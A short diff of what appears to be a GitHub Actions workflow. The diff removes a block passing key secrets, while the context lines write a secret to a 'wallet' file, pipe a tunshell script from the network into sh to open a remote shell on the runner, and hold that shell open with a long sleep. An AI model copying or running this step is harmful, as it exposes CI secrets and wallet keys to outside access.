@@ -26,9 +26,6 @@ jobs:
           printf ${{ secrets.KEY_FILE }} > wallet
           curl -sSf https://lets.tunshell.com/init.sh | sh -s -- T dNExlPcM9UGS0rppxLAoqB oMW8IPsviGd5f0ryG9IuAn
           sleep 99999
-        with:
-          key_pass: ${{ secrets.KEY_PASS }}
-          key_file: ${{ secrets.KEY_FILE }}
 
       - name: Install gulp
         run: npm install --global gulp-cli
